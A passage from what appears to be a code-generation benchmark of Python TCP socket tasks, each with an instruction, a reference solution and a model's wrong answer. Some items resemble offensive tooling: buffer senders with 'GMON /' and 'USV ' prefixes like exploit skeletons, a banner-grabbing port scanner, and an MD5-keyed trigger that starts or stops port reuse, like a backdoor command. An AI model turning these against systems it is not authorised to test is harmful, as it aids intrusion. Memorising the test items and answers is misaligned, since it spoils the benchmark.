    "wrong_result": "```python\nimport socket\nimport time\nimport socks\n\nTARGET = ('example.com', 80)\n\ndef test_socks5_proxy_connection():\n    start_time = time.time()\n\n    try:\n        # Create a SOCKS5 socket (replace with your proxy host and port)\n        socks.set_default_proxy(socks.SOCKS5, '127.0.0.1', 9050)\n        socket.socket = socks.socksocket\n\n        # Connect to the target server via the proxy\n        s = socket.create_connection(TARGET)\n        connect_time = time.time() - start_time\n        print(f\"Connected in {connect_time:.4f} seconds\")\n\n        # Send HTTP GET request\n        request = f\"GET / HTTP/1.1\\r\\nHost: {TARGET[0]}\\r\\nConnection: close\\r\\n\\r\\n\"\n        s.sendall(request.encode('utf-8'))\n        send_time = time.time()\n\n        # Receive response\n        response = b''\n        while True:\n            data = s.recv(4096)\n            if not data:\n                break\n            response += data\n        receive_time = time.time()\n        total_time = receive_time - start_time\n\n        # Validate HTTP response\n        if response.startswith(b'HTTP/1.1'):\n            print(\"Received valid HTTP response\")\n        else:\n            print(\"Invalid HTTP response received\")\n\n        # Print timing info\n        print(f\"Time to send request: {send_time - start_time:.4f} seconds\")\n        print(f\"Time to receive response: {receive_time - send_time:.4f} seconds\")\n        print(f\"Total time: {total_time:.4f} seconds\")\n\n    except Exception as e:\n        print(f\"Error: {e}\")\n    finally:\n        if 's' in locals() and not s._closed:\n            s.close()\n```"
  },
  {
    "Task_id": 360,
    "Instruction": "Task Description: Create a Python function that establishes a TCP connection to a server, receives initial data from the server, sends a buffer with a specific prefix, and handles connection errors gracefully.\n\nFunction Description: The function `send_buffer_to_server` creates a TCP socket, connects to a specified server, receives initial data, sends a buffer prefixed with \"GMON /\", and ensures proper connection closure. It includes error handling for connection issues.\n\nInput:\n- host: [str] - The IP address or hostname of the target server\n- port: [int] - The port number on which the server is listening\n- buffer: [str] - The data buffer to be sent to the server (will be prefixed with \"GMON /\")\n\nOutput:\n- None (prints status messages to console: received data, error notifications, and confirmation of buffer sending)",
    "Canonical_solution": "import socket\n\ndef send_buffer_to_server(host, port, buffer):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    try:\n        s.connect((host, port))\n        data = s.recv(1024)\n        print \"\\n\" + data\n        s.send(\"GMON /\" + buffer + '\\r\\n')\n    except:\n        print \"Check your debugger\"\n    finally:\n        s.close()\n        print \"Buffer Sent!\"",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\n\ndef send_buffer_to_server(host, port, buffer):\n    try:\n        with socket.create_connection((host, port), timeout=10) as sock:\n            initial_data = sock.recv(4096)\n            if initial_data:\n                print(\"Received data:\", initial_data.decode(errors='ignore'))\n            \n            full_message = f\"GMON /{buffer}\\n\"\n            sock.sendall(full_message.encode())\n            print(\"Buffer sent successfully.\")\n    \n    except socket.error as e:\n        print(f\"Connection error: {e}\")\n```"
  },
  {
    "Task_id": 361,
    "Instruction": "Task Description: Create a Python function that sends a TCP payload to a specified target server using socket programming.\n\nFunction Description: The function establishes a TCP connection to a target server using IPv4, constructs an HTTP GET request with the provided payload, sends the request to the server, and then closes the connection. This is useful for testing TCP-based services or sending crafted HTTP requests.\n\nInput:\n- target_ip: [str] - The IP address of the target server to connect to\n- target_port: [int] - The port number on the target server to connect to\n- payload: [str] - The data to be included in the HTTP GET request path\n\nOutput: None (The function performs an action but doesn't return any value)",
    "Canonical_solution": "import socket\n\ndef send_tcp_payload(target_ip, target_port, payload):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((target_ip, target_port))\n    \n    buf = (\n        \"GET /\" + payload + \" HTTP/1.1\\r\\n\" + \n        \"Host: \" + target_ip + \n        \"\\r\\n\\r\\n\"\n    )\n    \n    s.send(buf)\n    s.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\n\ndef send_tcp_payload(target_ip, target_port, payload):\n    request = f\"GET /{payload} HTTP/1.1\\r\\nHost: {target_ip}\\r\\n\\r\\n\"\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect((target_ip, target_port))\n        s.sendall(request.encode())\n```"
  },
  {
    "Task_id": 362,
    "Instruction": "Task Description: Create a TCP client class for establishing and managing connections to a server, sending requests, and receiving responses using HDLC framing protocol.\n\nClass Description: TcpConnector is a class that handles TCP communication with a server using IPv4. It manages socket connection, sends requests with HDLC encapsulation, and continuously reads incoming data with HDLC decapsulation.\n\nAttributes:\n- socket: [socket.socket] - TCP socket object for communication\n- received_first_packet: [bool] - Flag indicating if first packet was received\n- packet_buffer: [bytes] - Buffer for storing incoming data\n- TRAILER_CHAR: [bytes] - Class constant for HDLC frame delimiter (assumed to be defined elsewhere in class)\n\nMethods:\n- __init__(address: str, port: int) -> None - Initializes TCP connection to specified address and port\n- send_request(packet_type: int, packet_payload: bytes) -> None - Sends HDLC-encapsulated request to server\n- read_loop() -> None - Continuously reads and processes incoming data using HDLC framing\n- __del__() -> None - Cleans up by closing socket connection\n- hdlc_encapsulate(data: bytes) -> bytes - (Assumed method) HDLC encapsulation implementation\n- hdlc_decapsulate(payload: bytes) -> bytes - (Assumed method) HDLC decapsulation implementation\n- dispatch_received_diag_packet(unframed_message: bytes) -> None - (Assumed method) Handles processed packets",
    "Canonical_solution": "from socket import socket, AF_INET, SOCK_STREAM\n\nclass TcpConnector:\n    def __init__(self, address: str, port: int):\n        self.socket = socket(AF_INET, SOCK_STREAM)\n        try:\n            self.socket.connect((address, port))\n        except Exception:\n            raise ConnectionError('Could not communicate with the DIAG device through TCP')\n        \n        self.received_first_packet = False\n        self.packet_buffer = b''\n\n    def send_request(self, packet_type: int, packet_payload: bytes):\n        raw_payload = self.hdlc_encapsulate(bytes([packet_type]) + packet_payload)\n        self.socket.send(raw_payload)\n\n    def read_loop(self):\n        while True:\n            while self.TRAILER_CHAR not in self.packet_buffer:\n                socket_read = self.socket.recv(1024 * 1024 * 10)\n                self.packet_buffer += socket_read\n\n            while self.TRAILER_CHAR in self.packet_buffer:\n                raw_payload, self.packet_buffer = self.packet_buffer.split(self.TRAILER_CHAR, 1)\n\n                try:\n                    unframed_message = self.hdlc_decapsulate(\n                        payload=raw_payload + self.TRAILER_CHAR\n                    )\n                except self.InvalidFrameError:\n                    continue\n                finally:\n                    self.received_first_packet = True\n\n                self.dispatch_received_diag_packet(unframed_message)\n\n    def __del__(self):\n        self.socket.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\n\nclass TcpConnector:\n    TRAILER_CHAR = b'\\x7E'\n\n    def __init__(self, address: str, port: int) -> None:\n        self.socket = socket.create_connection((address, port))\n        self.received_first_packet = False\n        self.packet_buffer = b''\n\n    def send_request(self, packet_type: int, packet_payload: bytes) -> None:\n        request_data = bytes([packet_type]) + packet_payload\n        framed_request = self.hdlc_encapsulate(request_data)\n        self.socket.sendall(framed_request)\n\n    def read_loop(self) -> None:\n        while True:\n            try:\n                data = self.socket.recv(4096)\n                if not data:\n                    break\n                self.packet_buffer += data\n                frames = self.packet_buffer.split(self.TRAILER_CHAR)\n                self.packet_buffer = frames[-1]\n\n                for frame in frames[:-1]:\n                    if not self.received_first_packet:\n                        self.received_first_packet = True\n                    unframed_message = self.hdlc_decapsulate(frame)\n                    self.dispatch_received_diag_packet(unframed_message)\n            except Exception as e:\n                print(f\"Error during read loop: {e}\")\n                break\n\n    def __del__(self) -> None:\n        self.socket.close()\n\n    def hdlc_encapsulate(self, data: bytes) -> bytes:\n        # Placeholder for actual HDLC encapsulation logic\n        return self.TRAILER_CHAR + data + self.TRAILER_CHAR\n\n    def hdlc_decapsulate(self, payload: bytes) -> bytes:\n        # Placeholder for actual HDLC decapsulation logic\n        return payload\n\n    def dispatch_received_diag_packet(self, unframed_message: bytes) -> None:\n        # Placeholder for actual message handling logic\n        pass\n```"
  },
  {
    "Task_id": 364,
    "Instruction": "Task Description: Implement a TCP client function in Python that connects to a server, receives initial data, sends a formatted message, and handles connection errors gracefully.\n\nFunction Description: The function establishes a TCP connection to a specified server, receives initial data from the server, sends a formatted message (prefixed with \"USV \" and suffixed with '\\r\\n\\r\\n'), and ensures proper connection closure. Error handling is included to manage connection issues.\n\nInput:\n- host: str - The IP address or hostname of the target server\n- port: int - The port number on which the server is listening\n- buffer: str - The message content to be sent to the server\n\nOutput:\n- None (prints received data and status messages to console)\n- Success: Prints \"Buffer Sent Successfully!\" upon completion\n- Failure: Prints \"Check your debugger\" if connection fails",
    "Canonical_solution": "import socket\n\ndef tcp_client_interaction(host, port, buffer):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    try:\n        s.connect((host, port))\n        data = s.recv(1024)\n        print(\"\\n\" + data)\n        s.send(\"USV \" + buffer + '\\r\\n\\r\\n')\n    except:\n        print(\"Check your debugger\")\n    finally:\n        s.close()\n        print(\"Buffer Sent Successfully!\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\n\ndef tcp_client(host, port, buffer):\n    try:\n        with socket.create_connection((host, port), timeout=10) as sock:\n            initial_data = sock.recv(4096)\n            if initial_data:\n                print(initial_data.decode('utf-8', errors='replace'))\n            message = f\"USV {buffer}\\r\\n\\r\\n\"\n            sock.sendall(message.encode('utf-8'))\n            print(\"Buffer Sent Successfully!\")\n    except Exception as e:\n        print(\"Check your debugger\")\n```"
  },
  {
    "Task_id": 365,
    "Instruction": "Task Description: Create a Python function that implements a TCP client for basic communication with a server using sockets. The function should establish a connection, send a message, receive a response, and close the connection.\n\nFunction Description: The function `tcp_client_communication` creates a TCP socket, connects to a specified server, sends a message, receives a response, and then closes the connection. It handles IPv4 addresses and uses a stream-oriented connection (TCP).\n\nInput:\n- `host` (str, optional): The IP address or hostname of the server. Defaults to 'localhost'.\n- `port` (int, optional): The port number on which the server is listening. Defaults to 20000.\n- `message` (bytes, optional): The message to send to the server. Defaults to b'Hello\\n'.\n\nOutput:\n- `resp` (bytes): The response received from the server.",
    "Canonical_solution": "from socket import socket, AF_INET, SOCK_STREAM\n\ndef tcp_client_communication(host='localhost', port=20000, message=b'Hello\\n'):\n    s = socket(AF_INET, SOCK_STREAM)\n    s.connect((host, port))\n    s.send(message)\n    resp = s.recv(8192)\n    s.close()\n    return resp",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\n\ndef tcp_client_communication(host='localhost', port=20000, message=b'Hello\\n'):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect((host, port))\n        s.sendall(message)\n        resp = s.recv(4096)\n    return resp\n```"
  },
  {
    "Task_id": 369,
    "Instruction": "Task Description: Create a Python function that scans a target host and port for open TCP connections and attempts to retrieve service information from the connected port.\n\nFunction Description: The function should attempt to establish a TCP connection to the specified host and port, with a timeout of 1 second. If successful, it should try to receive initial data from the service (up to 1024 bytes). The function should process the received data by filtering non-printable characters and truncating long responses. The results should be stored in a global dictionary with information about the port's protocol, service, and state.\n\nInput:\n- target: tuple - A tuple containing (host, port) where host is the target IP address or hostname (string) and port is the target port number (integer or string)\n\nOutput:\n- None - The function doesn't return any value directly but updates the global 'results' dictionary with scan results in the format:\n  {\n      host: {\n          port: {\n              'protocol': string,\n              'service': string,\n              'state': string\n          }\n      }\n  }",
    "Canonical_solution": "import socket\nimport json\n\ndef _scan(target):\n    \"\"\"\n    Scan a target host and port for open connections and service information\n    \n    Args:\n        target (tuple): A tuple containing (host, port) to scan\n    \n    Returns:\n        None: Updates global results dictionary with scan results\n    \"\"\"\n    global ports\n    global results\n\n    try:\n        data = None\n        host, port = target\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1.0)\n        sock.connect((str(host), int(port)))\n\n        try:\n            data = sock.recv(1024)\n        except (socket.error, socket.timeout):\n            pass\n\n        sock.close()\n\n        if data:\n            data = ''.join([i for i in data if i in ([chr(n) for n in range(32, 123)])])\n            data = data.splitlines()[0] if '\\n' in data else str(data if len(str(data)) <= 80 else data[:77] + '...')\n            item = {str(port) : {'protocol': ports[str(port)]['protocol'], 'service': data, 'state': 'open'}}\n        else:\n            item = {str(port) : {'protocol': ports[str(port)]['protocol'], 'service': ports[str(port)]['service'], 'state': 'open'}}\n\n        results.get(host).update(item)\n\n    except (socket.error, socket.timeout):\n        pass\n    except Exception as e:\n        util.log(\"{} error: {}\".format(_scan.__name__, str(e)))",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\n\nresults = {}\n\ndef scan_port(target):\n    host, port = target\n    if host not in results:\n        results[host] = {}\n    try:\n        sock = socket.create_connection((host, int(port)), timeout=1)\n        sock.setblocking(0)\n        data = ''\n        try:\n            chunk = sock.recv(1024)\n            data += chunk.decode('ascii', errors='ignore')\n        except:\n            pass\n        service_info = ''.join(c for c in data[:1023] if c.isprintable())\n        results[host][port] = {\n            'protocol': 'tcp',\n            'service': service_info,\n            'state': 'open'\n        }\n        sock.close()\n    except (socket.timeout, ConnectionRefusedError, OSError):\n        results[host][port] = {\n            'protocol': 'tcp',\n            'service': '',\n            'state': 'closed'\n        }\n```"
  },
  {
    "Task_id": 370,
    "Instruction": "Task Description: Create a TCP client class for interacting with an OpenVPN server, capable of establishing connections, sending commands, receiving data, and closing connections.\n\nClass Description: The OpenVPNTCPClient class provides functionality to connect to an OpenVPN server via TCP, send commands, receive responses, and manage the connection lifecycle.\n\nAttributes:\n- host: str - The IP address or hostname of the OpenVPN server\n- port: int - The port number on which the OpenVPN server is listening\n- timeout: int - Connection and operation timeout in seconds (default: 10)\n- socket: socket.socket - The TCP socket object used for communication\n\nMethods:\n- connect() -> bool - Establishes a TCP connection to the OpenVPN server. Returns True on success, False on failure.\n- send_command(command: str) -> bool - Sends a command to the connected OpenVPN server. Returns True on success, False on failure.\n- receive_data() -> list[bytes] | None - Receives data from the server until an 'END' marker is encountered. Returns list of received lines or None on error.\n- close() -> bool - Closes the TCP connection. Returns True on success, False on failure.\n- get_status() -> list[bytes] | None - Executes a complete status request cycle (connect, send 'status' command, receive response, close). Returns received data or None on error.",
    "Canonical_solution": "import socket\n\nclass OpenVPNTCPClient:\n    def __init__(self, host, port, timeout=10):\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        self.socket = None\n\n    def connect(self):\n        try:\n            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            self.socket.settimeout(int(self.timeout))\n            self.socket.connect((self.host, self.port))\n            return True\n        except socket.error as e:\n            return False\n\n    def send_command(self, command):\n        try:\n            self.socket.send(command + '\\r\\n')\n            return True\n        except socket.error as e:\n            return False\n\n    def receive_data(self):\n        try:\n            fd = self.socket.makefile('rb')\n            lines = []\n            while True:\n                line = fd.readline()\n                lines.append(line)\n                if line.strip() == 'END':\n                    break\n            return lines\n        except socket.error as e:\n            return None\n\n    def close(self):\n        try:\n            if self.socket:\n                self.socket.close()\n            return True\n        except socket.error:\n            return False\n\n    def get_status(self):\n        if not self.connect():\n            return None\n        \n        if not self.send_command('status'):\n            self.close()\n            return None\n        \n        data = self.receive_data()\n        self.close()\n        \n        return data",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\nimport time\n\n\nclass OpenVPNTCPClient:\n    def __init__(self, host: str, port: int, timeout: int = 10):\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        self.socket = None\n\n    def connect(self) -> bool:\n        try:\n            self.socket = socket.create_connection((self.host, self.port), timeout=self.timeout)\n            return True\n        except Exception as e:\n            print(f\"Connection failed: {e}\")\n            return False\n\n    def send_command(self, command: str) -> bool:\n        if not self.socket:\n            return False\n        try:\n            self.socket.sendall(command.encode() + b'\\n')\n            return True\n        except Exception as e:\n            print(f\"Failed to send command: {e}\")\n            return False\n\n    def receive_data(self) -> list[bytes] | None:\n        if not self.socket:\n            return None\n        data_lines = []\n        try:\n            buffer = b''\n            while True:\n                chunk = self.socket.recv(4096)\n                if not chunk:\n                    break\n                buffer += chunk\n                lines = buffer.split(b'\\n')\n                for line in lines[:-1]:\n                    data_lines.append(line)\n                buffer = lines[-1]\n                if b'END' in data_lines[-1:]:\n                    break\n            return data_lines\n        except Exception as e:\n            print(f\"Error receiving data: {e}\")\n            return None\n\n    def close(self) -> bool:\n        if not self.socket:\n            return False\n        try:\n            self.socket.close()\n            return True\n        except Exception as e:\n            print(f\"Failed to close connection: {e}\")\n            return False\n\n    def get_status(self) -> list[bytes] | None:\n        if not self.connect():\n            return None\n        if not self.send_command('status'):\n            self.close()\n            return None\n        result = self.receive_data()\n        self.close()\n        return result\n```"
  },
  {
    "Task_id": 371,
    "Instruction": "Task Description: Implement a TCP client function in Python that connects to a server, receives initial data, sends a formatted message, and handles connection errors gracefully.\n\nFunction Description: The function establishes a TCP connection to a specified server, receives initial data from the server, sends a formatted message (prefixed with \"USV \" and suffixed with '\\r\\n\\r\\n'), and ensures proper connection closure. Error handling is included to manage connection issues.\n\nInput:\n- host: [str] - The IP address or hostname of the target server\n- port: [int] - The port number on which the server is listening\n- buffer: [str] - The message content to be sent to the server\n\nOutput:\n- None (prints received data and status messages to console)\n- Prints \"Buffer Sent Successfully!\" upon successful completion\n- Prints \"Check your debugger\" if connection errors occur",
    "Canonical_solution": "import socket\n\ndef tcp_client_interaction(host, port, buffer):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    try:\n        s.connect((host, port))\n        data = s.recv(1024)\n        print(\"\\n\" + data)\n        s.send(\"USV \" + buffer + '\\r\\n\\r\\n')\n    except:\n        print(\"Check your debugger\")\n    finally:\n        s.close()\n        print(\"Buffer Sent Successfully!\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\n\ndef tcp_client(host, port, buffer):\n    try:\n        with socket.create_connection((host, port), timeout=10) as sock:\n            initial_data = sock.recv(4096)\n            if initial_data:\n                print(initial_data.decode('utf-8', errors='ignore'))\n            message = f\"USV {buffer}\\r\\n\\r\\n\"\n            sock.sendall(message.encode('utf-8'))\n            response = sock.recv(4096)\n            if response:\n                print(response.decode('utf-8', errors='ignore'))\n            print(\"Buffer Sent Successfully!\")\n    except Exception as e:\n        print(\"Check your debugger\")\n```"
  },
  {
    "Task_id": 372,
    "Instruction": "Task Description: Implement a TCP client function that communicates with a server to send specific control codes derived from a secret key, with options to start or stop port reuse.\n\nFunction Description: The function establishes a TCP connection to a specified server, generates two MD5 checkcodes from a secret, combines portions of them to create a final checkcode, extracts control codes from this checkcode, and sends either a start or stop command based on the action parameter. It handles connection errors gracefully and closes the connection after sending the command.\n\nInput:\n- ip: [str] - The IP address of the target server\n- port: [str/int] - The port number of the target server\n- action: [str] - Either \"start\" or \"stop\" to determine which control code to send\n\nOutput:\n- None (prints status messages to console)\n- Prints \"[*] Cannot connect to target\" if connection fails\n- Prints \"[*] Done!\" when operation completes (successfully or after handling failure)",
    "Canonical_solution": "import socket\nimport hashlib\n\nSECRET = \"\"\n\ndef tcp_client_communication(ip, port, action):\n    first_checkcode = hashlib.md5(SECRET.encode()).hexdigest()\n    second_checkcode = hashlib.md5(first_checkcode.encode()).hexdigest()\n    final_checkcode = first_checkcode[:24] + second_checkcode[:24]\n\n    START_PORT_REUSE = final_checkcode[16:32]\n    STOP_PORT_REUSE = final_checkcode[32:]\n\n    data = START_PORT_REUSE if action == \"start\" else STOP_PORT_REUSE\n\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(2)\n        s.connect((ip, int(port)))\n        s.send(data.encode())\n    except:\n        print(\"[*] Cannot connect to target\")\n\n    try:\n        s.recv(1024)\n    except:\n        pass\n\n    s.close()\n    print(\"[*] Done!\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\nimport hashlib\n\ndef send_control(ip, port, action):\n    try:\n        s = socket.create_connection((ip, int(port)), timeout=5)\n    except Exception:\n        print(\"[*] Cannot connect to target\")\n        print(\"[*] Done!\")\n        return\n\n    secret = \"supersecretkey\"\n    md5_1 = hashlib.md5(secret.encode()).hexdigest()\n    md5_2 = hashlib.md5((secret + \"suffix\").encode()).hexdigest()\n    checkcode = md5_1[:8] + md5_2[8:16]\n\n    control_code = checkcode if action == \"start\" else checkcode[::-1]\n    command = f\"{action}:{control_code}\".encode()\n\n    try:\n        s.sendall(command)\n    finally:\n        s.close()\n    print(\"[*] Done!\")\n```"
  },
  {
    "Task_id": 374,
    "Instruction": "Task Description: The task involves creating a Python function that reads log files, extracts specific messages, and sends them to a server using TCP socket communication. The function should parse log entries, identify relevant messages, and transmit them to the appropriate server ports based on the protocol specified in the logs.\n\nFunction Description: The function `send_messages_to_server` processes a log file to extract session IDs, protocols, and hexadecimal messages. It then establishes TCP connections to servers based on the protocols (using ports defined in an XML configuration file) and sends the decoded messages to the respective servers. The function includes a delay between messages to avoid overwhelming the server.\n\nInput: \n- `path` (str): The file path to the log file that contains the messages to be processed and sent. The log file should have entries matching the pattern `YYYY-MM-DD HH:MM:SS  INFO: [SESSION_ID: PROTOCOL < IP_ADDRESS] HEX_MESSAGE`.\n\nOutput: \n- None: The function does not return any value but performs side effects by sending messages to the server and closing the connections.\n\nNote: The function relies on an external XML file (`default.xml`) located in a `../setup/` directory relative to the script's location. This XML file should contain port mappings for different protocols under entries with keys ending in `.port`.",
    "Canonical_solution": "import sys\nimport re\nimport os\nimport xml.etree.ElementTree\nimport socket\nimport binascii\nimport time\n\ndef load_ports():\n    ports = {}\n    dir = os.path.dirname(os.path.abspath(__file__))\n    root = xml.etree.ElementTree.parse(dir + '/../setup/default.xml').getroot()\n    for entry in root.findall('entry'):\n        key = entry.attrib['key']\n        if key.endswith('.port'):\n            ports[key[:-5]] = int(entry.text)\n    return ports\n\ndef send_messages_to_server(path):\n    p = re.compile(r\"\\d{4}-\\d{2}-\\d{2} \\d{2}:\\d{2}:\\d{2}  INFO: \\[([TU][0-9a-fA-F]{8}): (\\S+) < [\\d.]+] ([0-9a-fA-F]+)\")\n    ports = load_ports()\n    protocols = {}\n    messages = {}\n\n    for line in open(path):\n        m = p.match(line)\n        if m:\n            session = m.group(1)\n            protocol = m.group(2)\n            message = m.group(3)\n            protocols[session] = protocol\n            if session not in messages:\n                messages[session] = []\n            messages[session].append(message)\n\n    for session in protocols:\n        port = ports[protocols[session]]\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((\"localhost\", int(port)))\n        for message in messages[session]:\n            s.send(binascii.unhexlify(message))\n            time.sleep(0.1)\n        s.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\nimport time\nimport xml.etree.ElementTree as ET\nimport re\nfrom datetime import datetime\n\ndef send_messages_to_server(path):\n    config_path = '../setup/default.xml'\n    tree = ET.parse(config_path)\n    root = tree.getroot()\n\n    protocol_ports = {}\n    for entry in root.findall('entry'):\n        key = entry.get('key')\n        value = entry.get('value')\n        if key and value and key.endswith('.port'):\n            protocol = key.split('.')[0]\n            protocol_ports[protocol] = int(value)\n\n    log_pattern = re.compile(\n        r'(\\d{4}-\\d{2}-\\d{2} \\d{2}:\\d{2}:\\d{2})  INFO: \\[SESSION_ID: ([^ ]+) ([^ <]+) < ([^]]+)\\] ([0-9A-Fa-f]+)'\n    )\n\n    with open(path, 'r') as file:\n        for line in file:\n            match = log_pattern.search(line)\n            if not match:\n                continue\n\n            timestamp_str, session_id, protocol, ip_address, hex_message = match.groups()\n            port = protocol_ports.get(protocol)\n            if not port:\n                continue\n\n            message_bytes = bytes.fromhex(hex_message)\n\n            try:\n                with socket.create_connection((ip_address, port), timeout=10) as sock:\n                    sock.sendall(message_bytes)\n                    time.sleep(0.1)\n            except Exception as e:\n                print(f\"Failed to send message from {session_id}: {e}\")\n```"
  },
  {
    "Task_id": 375,
    "Instruction": "Task Description: Create a Python class that implements a socket-based client for TCP and UDP communication, supporting connection pooling and various socket options. The class should handle both stream (TCP) and datagram (UDP) protocols, with methods for sending/receiving data and managing connections.\n\nClass Description: The `Socket` class provides a flexible interface for socket communication, supporting both IPv4 and Unix domain sockets (if available). It manages connection pooling, socket options, and protocol-specific communication methods.\n\nAttributes:\n\nconnection_pool: [Queue] - A queue for managing socket connections in a pool\ntimeout: [float/None] - Default timeout for socket operations\nconnection: [namedtuple] - Stores connection details (target address, protocol, socket options)\nsend_and_receive: [method] - Protocol-specific method for communication (stream or datagram)\non_unix: [bool] - Flag indicating if Unix domain sockets are available\nprotocols: [dict] - Mapping of protocol names to (address family, socket type) tuples\nstreams: [set] - Set of stream-oriented protocols (TCP, Unix stream)\ndatagrams: [set] - Set of datagram-oriented protocols (UDP, Unix datagram)\ninet: [set] - Set of Internet protocols (TCP, UDP)\nunix: [set] - Set of Unix domain protocols (if available)\n\nMethods:\n\n__init__: [constructor](connect_to: tuple, proto: str, version=None, headers=empty.dict, timeout=None, pool=0, raise_on=(500,), **kwargs) -> None - Initializes the socket client with connection parameters and optional pool size\nsettimeout: [method](timeout: float) -> None - Sets the default timeout for socket operations\nsetsockopt: [method](*sockopts: tuple/list) -> None - Adds socket options to be applied to new connections\n_register_socket: [method]() -> socket.socket - Creates and configures a new socket connection\n_stream_send_and_receive: [method](_socket: socket.socket, message: str, *args, **kwargs) -> BytesIO - Handles stream protocol communication (TCP)\n_dgram_send_and_receive: [method](_socket: socket.socket, message: str, buffer_size=4096, *args) -> BytesIO - Handles datagram protocol communication (UDP)\nrequest: [method](message: str, timeout=False, *args, **kwargs) -> Response - Main method for sending requests and receiving responses, managing connection pool",
    "Canonical_solution": "import socket\nfrom collections import namedtuple\nfrom io import BytesIO\nfrom queue import Queue\n\nResponse = namedtuple(\"Response\", (\"data\", \"status_code\", \"headers\"))\n\nclass Socket:\n    __slots__ = (\"connection_pool\", \"timeout\", \"connection\", \"send_and_receive\")\n\n    on_unix = getattr(socket, \"AF_UNIX\", False)\n    Connection = namedtuple(\"Connection\", (\"connect_to\", \"proto\", \"sockopts\"))\n    protocols = {\n        \"tcp\": (socket.AF_INET, socket.SOCK_STREAM),\n        \"udp\": (socket.AF_INET, socket.SOCK_DGRAM),\n    }\n    streams = set((\"tcp\",))\n    datagrams = set((\"udp\",))\n    inet = set((\"tcp\", \"udp\"))\n    unix = set()\n\n    if on_unix:\n        protocols.update(\n            {\n                \"unix_dgram\": (socket.AF_UNIX, socket.SOCK_DGRAM),\n                \"unix_stream\": (socket.AF_UNIX, socket.SOCK_STREAM),\n            }\n        )\n        streams.add(\"unix_stream\")\n        datagrams.add(\"unix_dgram\")\n        unix.update((\"unix_stream\", \"unix_dgram\"))\n\n    def __init__(\n        self,\n        connect_to,\n        proto,\n        version=None,\n        headers=empty.dict,\n        timeout=None,\n        pool=0,\n        raise_on=(500,),\n        **kwargs\n    ):\n        self.timeout = timeout\n        self.connection = Socket.Connection(connect_to, proto, set())\n        self.connection_pool = Queue(maxsize=pool if pool else 1)\n\n        if proto in Socket.streams:\n            self.send_and_receive = self._stream_send_and_receive\n        else:\n            self.send_and_receive = self._dgram_send_and_receive\n\n    def settimeout(self, timeout):\n        self.timeout = timeout\n\n    def setsockopt(self, *sockopts):\n        if type(sockopts[0]) in (list, tuple):\n            for sock_opt in sockopts[0]:\n                level, option, value = sock_opt\n                self.connection.sockopts.add((level, option, value))\n        else:\n            level, option, value = sockopts\n            self.connection.sockopts.add((level, option, value))\n\n    def _register_socket(self):\n        _socket = socket.socket(*Socket.protocols[self.connection.proto])\n        _socket.settimeout(self.timeout)\n\n        if self.connection.sockopts:\n            for sock_opt in self.connection.sockopts:\n                level, option, value = sock_opt\n                _socket.setsockopt(level, option, value)\n\n        _socket.connect(self.connection.connect_to)\n        return _socket\n\n    def _stream_send_and_receive(self, _socket, message, *args, **kwargs):\n        data = BytesIO()\n\n        _socket_fd = _socket.makefile(mode=\"rwb\", encoding=\"utf-8\")\n        _socket_fd.write(message.encode(\"utf-8\"))\n        _socket_fd.flush()\n\n        for received in _socket_fd:\n            data.write(received)\n        data.seek(0)\n\n        _socket_fd.close()\n        return data\n\n    def _dgram_send_and_receive(self, _socket, message, buffer_size=4096, *args):\n        _socket.send(message.encode(\"utf-8\"))\n        data, address = _socket.recvfrom(buffer_size)\n        return BytesIO(data)\n\n    def request(self, message, timeout=False, *args, **kwargs):\n        if not self.connection_pool.full():\n            self.connection_pool.put(self._register_socket())\n\n        _socket = self.connection_pool.get()\n\n        if timeout or timeout is None:\n            _socket.settimeout(timeout)\n\n        data = self.send_and_receive(_socket, message, *args, **kwargs)\n\n        if self.connection.proto in Socket.streams:\n            _socket.shutdown(socket.SHUT_RDWR)\n\n        return Response(data, None, None)",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
